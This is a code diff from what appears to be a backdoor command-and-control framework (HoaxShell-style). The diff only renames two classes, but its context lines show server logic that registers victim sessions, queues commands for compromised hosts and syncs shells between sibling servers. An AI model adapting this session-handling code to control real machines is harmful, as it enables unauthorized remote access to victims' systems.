@@ -29,7 +29,7 @@ from .settings import ThreadingParams, CoreServerSettings, SessionsManagerSettin
 filterwarnings("ignore", category=DeprecationWarning)
 
 
-class Payload_generator:
+class PayloadGenerator:
 
     def __init__(self):
 
@@ -211,7 +211,7 @@ class Payload_generator:
             elif domain and HoaxshellSettings.ssl_support:
                 payload = payload.replace('*DISABLE_SSL_CHK*', '')
 
-            Sessions_manager.legit_session_ids[session_unique_id] = {
+            SessionsManager.legit_session_ids[session_unique_id] = {
                 'OS Type': args_dict['os'].capitalize(),
                 'constraint_mode': boolean_args['constraint_mode'],
                 'frequency': frequency,
@@ -487,7 +487,7 @@ class Obfuscator:
         return payload
 
 
-class Sessions_manager:
+class SessionsManager:
     active_sessions = {}
     legit_session_ids = {}
 
@@ -537,8 +537,8 @@ class Sessions_manager:
     @staticmethod
     def return_session_owner_id(session_id):
 
-        if session_id in Sessions_manager.active_sessions.keys():
-            return Sessions_manager.active_sessions[session_id]['Owner']
+        if session_id in SessionsManager.active_sessions.keys():
+            return SessionsManager.active_sessions[session_id]['Owner']
 
         else:
             return None
@@ -546,7 +546,7 @@ class Sessions_manager:
     @staticmethod
     def alias_to_session_id(alias):
 
-        active_sessions_clone = deepcopy(Sessions_manager.active_sessions)
+        active_sessions_clone = deepcopy(SessionsManager.active_sessions)
         active_sessions = active_sessions_clone.keys()
         sid = False
 
@@ -651,12 +651,12 @@ class Hoaxshell(BaseHTTPRequestHandler):
     @staticmethod
     def activate_shell_session(session_id, os_type):
 
-        session_data = Sessions_manager.active_sessions[session_id]
+        session_data = SessionsManager.active_sessions[session_id]
         is_remote_shell = True if not session_data['self_owned'] else False
 
         if is_remote_shell:
             # Get the shell session owner's sibling ID
-            session_owner_id = Sessions_manager.return_session_owner_id(session_id)
+            session_owner_id = SessionsManager.return_session_owner_id(session_id)
 
         hostname = session_data['Computername']
         uname = session_data['Username']
@@ -741,20 +741,20 @@ class Hoaxshell(BaseHTTPRequestHandler):
         except:
             session_id = None
 
-        if session_id and (session_id not in Sessions_manager.active_sessions.keys()):
-            if session_id in Sessions_manager.legit_session_ids.keys():
+        if session_id and (session_id not in SessionsManager.active_sessions.keys()):
+            if session_id in SessionsManager.legit_session_ids.keys():
                 h = session_id.split('-')
                 Hoaxshell.verify.append(h[0])
                 Hoaxshell.get_cmd.append(h[1])
                 Hoaxshell.post_res.append(h[2])
-                Sessions_manager.active_sessions[session_id] = {
+                SessionsManager.active_sessions[session_id] = {
                     'IP Address': self.client_address[0],
                     'Port': self.client_address[1],
                     'execution_verified': False,
                     'Status': 'Active',
                     'last_received': timestamp,
-                    'OS Type': Sessions_manager.legit_session_ids[session_id]['OS Type'],
-                    'frequency': Sessions_manager.legit_session_ids[session_id]['frequency'],
+                    'OS Type': SessionsManager.legit_session_ids[session_id]['OS Type'],
+                    'frequency': SessionsManager.legit_session_ids[session_id]['frequency'],
                     'Owner': Hoaxshell.server_unique_id,
                     'self_owned': True,
                     'aliased': False,
@@ -763,8 +763,8 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
                 Hoaxshell.command_pool[session_id] = []
 
-        elif session_id and (session_id in Sessions_manager.active_sessions.keys()):
-            Sessions_manager.active_sessions[session_id]['last_received'] = timestamp
+        elif session_id and (session_id in SessionsManager.active_sessions.keys()):
+            SessionsManager.active_sessions[session_id]['last_received'] = timestamp
 
 
         elif not session_id:
@@ -773,13 +773,13 @@ class Hoaxshell(BaseHTTPRequestHandler):
         self.server_version = HoaxshellSettings.server_version
         self.sys_version = ""
         session_id = self.headers.get(Hoaxshell.header_id)
-        legit = True if session_id in Sessions_manager.legit_session_ids.keys() else False
+        legit = True if session_id in SessionsManager.legit_session_ids.keys() else False
 
         # Verify execution
         url_split = self.path.strip("/").split("/")
         if url_split[0] in Hoaxshell.verify and legit:
 
-            if Sessions_manager.active_sessions[session_id]['execution_verified']:
+            if SessionsManager.active_sessions[session_id]['execution_verified']:
                 print(f'\r[{INFO}] Received "Verify execution" request from an already established session (ignored).')
                 MainPrompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
                 return
@@ -789,9 +789,9 @@ class Hoaxshell(BaseHTTPRequestHandler):
             self.send_header('Access-Control-Allow-Origin', '*')
             self.end_headers()
             self.wfile.write(bytes('OK', "utf-8"))
-            Sessions_manager.active_sessions[session_id]['execution_verified'] = True
-            Sessions_manager.active_sessions[session_id]['Computername'] = url_split[1]
-            Sessions_manager.active_sessions[session_id]['Username'] = url_split[2]
+            SessionsManager.active_sessions[session_id]['execution_verified'] = True
+            SessionsManager.active_sessions[session_id]['Computername'] = url_split[1]
+            SessionsManager.active_sessions[session_id]['Username'] = url_split[2]
             print(f'\r[{GREEN}Shell{END}] Backdoor session established on {ORANGE}{self.client_address[0]}{END}')
             MainPrompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
 
@@ -800,7 +800,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
             except Exception as e:
                 print(f'\r[{FAILED}] Failed to start shell monitoring thread: {e}')
 
-            new_session_data = deepcopy(Sessions_manager.active_sessions[session_id])
+            new_session_data = deepcopy(SessionsManager.active_sessions[session_id])
             new_session_data['session_id'] = session_id
             new_session_data['alias'] = None
             new_session_data['aliased'] = False
@@ -824,7 +824,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
             else:
                 self.wfile.write(bytes('None', 'utf-8'))
 
-            Sessions_manager.active_sessions[session_id]['last_received'] = timestamp
+            SessionsManager.active_sessions[session_id]['last_received'] = timestamp
             return
 
 
@@ -838,11 +838,11 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
         timestamp = int(datetime.now().timestamp())
         session_id = self.headers.get(self.header_id)
-        legit = True if (session_id in Sessions_manager.legit_session_ids.keys()) else False
+        legit = True if (session_id in SessionsManager.legit_session_ids.keys()) else False
 
         if legit:
 
-            Sessions_manager.active_sessions[session_id]['last_received'] = timestamp
+            SessionsManager.active_sessions[session_id]['last_received'] = timestamp
             self.server_version = HoaxshellSettings.server_version
             self.sys_version = ""
 
@@ -857,8 +857,8 @@ class Hoaxshell(BaseHTTPRequestHandler):
                     self.wfile.write(b'OK')
                     content_len = int(self.headers.get('Content-Length'))
                     output = self.rfile.read(content_len)
-                    # output = Hoaxshell.cmd_output_interpreter(self, output, constraint_mode = Sessions_manager.legit_session_ids[session_id]['constraint_mode'])
-                    output = self.cmd_output_interpreter(output, constraint_mode=Sessions_manager.legit_session_ids[session_id]['constraint_mode'])
+                    # output = Hoaxshell.cmd_output_interpreter(self, output, constraint_mode = SessionsManager.legit_session_ids[session_id]['constraint_mode'])
+                    output = self.cmd_output_interpreter(output, constraint_mode=SessionsManager.legit_session_ids[session_id]['constraint_mode'])
 
                     if isinstance(output, str):
                         print(f'\r{GREEN}{output}{END}')
@@ -908,8 +908,8 @@ class Hoaxshell(BaseHTTPRequestHandler):
     @staticmethod
     def dropSession(session_id):
 
-        os_type = Sessions_manager.active_sessions[session_id]['OS Type']
-        outfile = Sessions_manager.legit_session_ids[session_id]['exec_outfile']
+        os_type = SessionsManager.active_sessions[session_id]['OS Type']
+        outfile = SessionsManager.legit_session_ids[session_id]['exec_outfile']
         exit_command = 'stop-process $PID' if os_type == 'Windows' else 'echo byee'
 
         if (os_type == 'Windows' and not outfile) or os_type == 'Linux':
@@ -921,7 +921,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
     @staticmethod
     def terminate():
 
-        active_sessions_clone = deepcopy(Sessions_manager.active_sessions)
+        active_sessions_clone = deepcopy(SessionsManager.active_sessions)
         active_sessions = active_sessions_clone.keys()
 
         if active_sessions:
@@ -931,7 +931,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
             for session_id in active_sessions:
 
                 try:
-                    if Sessions_manager.active_sessions[session_id]['Owner'] == Core_server.SERVER_UNIQUE_ID:
+                    if SessionsManager.active_sessions[session_id]['Owner'] == Core_server.SERVER_UNIQUE_ID:
                         Hoaxshell.dropSession(session_id)
                     # Core_server.announce_session_termination({'session_id' : session_id})
 
@@ -948,21 +948,21 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
         ThreadingParams.thread_limiter.acquire()
 
-        while session_id in Sessions_manager.active_sessions.keys():
+        while session_id in SessionsManager.active_sessions.keys():
 
             timestamp = int(datetime.now().timestamp())
             tlimit = (HoaxshellSettings.default_frequency + SessionsManagerSettings.shell_state_change_after)
-            last_received = Sessions_manager.active_sessions[session_id]['last_received']
+            last_received = SessionsManager.active_sessions[session_id]['last_received']
             time_difference = abs(last_received - timestamp)
-            current_status = Sessions_manager.active_sessions[session_id]['Status']
+            current_status = SessionsManager.active_sessions[session_id]['Status']
 
             if (time_difference >= tlimit) and current_status == 'Active':
-                Sessions_manager.active_sessions[session_id]['Status'] = 'Undefined'
-                Core_server.announce_shell_session_stat_update({'session_id': session_id, 'Status': Sessions_manager.active_sessions[session_id]['Status']})
+                SessionsManager.active_sessions[session_id]['Status'] = 'Undefined'
+                Core_server.announce_shell_session_stat_update({'session_id': session_id, 'Status': SessionsManager.active_sessions[session_id]['Status']})
 
             elif (time_difference < tlimit) and current_status == 'Undefined':
-                Sessions_manager.active_sessions[session_id]['Status'] = 'Active'
-                Core_server.announce_shell_session_stat_update({'session_id': session_id, 'Status': Sessions_manager.active_sessions[session_id]['Status']})
+                SessionsManager.active_sessions[session_id]['Status'] = 'Active'
+                Core_server.announce_shell_session_stat_update({'session_id': session_id, 'Status': SessionsManager.active_sessions[session_id]['Status']})
 
             sleep(5)
 
@@ -1127,7 +1127,7 @@ class Core_server:
                         self.update_shell_sessions(decrypted_data[1])
 
                         # Return local sibling servers data
-                        sibling_servers_shells = str(self.encapsulate_dict(Sessions_manager.active_sessions, decrypted_data[0]))
+                        sibling_servers_shells = str(self.encapsulate_dict(SessionsManager.active_sessions, decrypted_data[0]))
                         encrypted_siblings_data = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), sibling_servers_shells, sibling_id[0:16].encode('utf-8'))
                         Core_server.send_msg(conn, encrypted_siblings_data)
 
@@ -1138,7 +1138,7 @@ class Core_server:
                         data = decrypted_data[1]
 
                         # Check if session exists
-                        if data['session_id'] in Sessions_manager.active_sessions.keys():
+                        if data['session_id'] in SessionsManager.active_sessions.keys():
                             Hoaxshell.command_pool[data['session_id']].append(data['command'])
                             Core_server.send_msg(conn, self.response_ack(sibling_id))
 
@@ -1158,9 +1158,9 @@ class Core_server:
 
                         new_session_id = decrypted_data[1]['session_id']
                         decrypted_data[1].pop('session_id', None)
-                        Sessions_manager.active_sessions[new_session_id] = decrypted_data[1]
+                        SessionsManager.active_sessions[new_session_id] = decrypted_data[1]
                         print(
-                            f'\r[{GREEN}Shell{END}] Backdoor session established on {ORANGE}{Sessions_manager.active_sessions[new_session_id]["IP Address"]}{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END})')
+                            f'\r[{GREEN}Shell{END}] Backdoor session established on {ORANGE}{SessionsManager.active_sessions[new_session_id]["IP Address"]}{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END})')
                         MainPrompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
                         del decrypted_data, new_session_id
                         Core_server.send_msg(conn, self.response_ack(sibling_id))
@@ -1170,7 +1170,7 @@ class Core_server:
                     elif decrypted_data[0] == 'shell_session_status_update':
 
                         session_id = decrypted_data[1]['session_id']
-                        Sessions_manager.active_sessions[session_id]['Status'] = decrypted_data[1]['Status']
+                        SessionsManager.active_sessions[session_id]['Status'] = decrypted_data[1]['Status']
                         Core_server.send_msg(conn, self.response_ack(sibling_id))
                         status = f'{GREEN}Active{END}' if decrypted_data[1]['Status'] == 'Active' else f'{ORANGE}Undefined{END}'
                         print(f'\r[{INFO}] Backdoor session {ORANGE}{session_id}{END} status changed to {status}.')
@@ -1186,8 +1186,8 @@ class Core_server:
 
                     elif decrypted_data[0] == 'session_terminated':
 
-                        victim_ip = Sessions_manager.active_sessions[decrypted_data[1]['session_id']]['IP Address']
-                        Sessions_manager.active_sessions.pop(decrypted_data[1]['session_id'], None)
+                        victim_ip = SessionsManager.active_sessions[decrypted_data[1]['session_id']]['IP Address']
+                        SessionsManager.active_sessions.pop(decrypted_data[1]['session_id'], None)
                         print(f'\r[{INFO}] Backdoor session on {ORANGE}{victim_ip}{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END}) terminated.')
 
                         if Hoaxshell.active_shell == decrypted_data[1]['session_id']:
@@ -1206,7 +1206,7 @@ class Core_server:
                         self.sibling_servers.pop(decrypted_data[1]['sibling_id'], None)
 
                         # Remove sessions associated with sibling server
-                        active_sessions_clone = deepcopy(Sessions_manager.active_sessions)
+                        active_sessions_clone = deepcopy(SessionsManager.active_sessions)
                         active_sessions = active_sessions_clone.keys()
                         lost_sessions = 0
 
@@ -1215,8 +1215,8 @@ class Core_server:
                             for session_id in active_sessions:
 
                                 try:
-                                    if Sessions_manager.active_sessions[session_id]['Owner'] == decrypted_data[1]['sibling_id']:
-                                        del Sessions_manager.active_sessions[session_id]
+                                    if SessionsManager.active_sessions[session_id]['Owner'] == decrypted_data[1]['sibling_id']:
+                                        del SessionsManager.active_sessions[session_id]
                                         lost_sessions += 1
 
                                 except:
@@ -1448,7 +1448,7 @@ class Core_server:
 
     def update_shell_sessions(self, shells_data):
 
-        current_shells = clone_dict_keys(Sessions_manager.active_sessions)
+        current_shells = clone_dict_keys(SessionsManager.active_sessions)
         additional_shells = 0
 
         if isinstance(shells_data, dict):
@@ -1457,7 +1457,7 @@ class Core_server:
                     shells_data[session_id]['alias'] = None
                     shells_data[session_id]['aliased'] = False
                     shells_data[session_id]['self_owned'] = False
-                    Sessions_manager.active_sessions[session_id] = shells_data[session_id]
+                    SessionsManager.active_sessions[session_id] = shells_data[session_id]
                     additional_shells += 1
 
         if additional_shells:
@@ -1519,7 +1519,7 @@ class Core_server:
                 self.update_siblings_data_table(remote_siblings_data[1])
 
             # Sync sibling servers shell sessions
-            remote_shells = Core_server.send_receive_one_encrypted(sibling_id, Sessions_manager.active_sessions, 'synchronize_sibling_servers_shells')
+            remote_shells = Core_server.send_receive_one_encrypted(sibling_id, SessionsManager.active_sessions, 'synchronize_sibling_servers_shells')
             self.update_shell_sessions(remote_shells[1])
 
         if not self.ping_sibling_servers:
@@ -1643,11 +1643,11 @@ class Core_server:
 
     def remove_all_sessions(self, sibling_id):
 
-        active_sessions = clone_dict_keys(Sessions_manager.active_sessions)
+        active_sessions = clone_dict_keys(SessionsManager.active_sessions)
 
         for session_id in active_sessions:
-            if Sessions_manager.active_sessions[session_id]['Owner'] == sibling_id:
-                del Sessions_manager.active_sessions[session_id]
+            if SessionsManager.active_sessions[session_id]['Owner'] == sibling_id:
+                del SessionsManager.active_sessions[session_id]
 
     def siblings_dict_to_list(self):
 
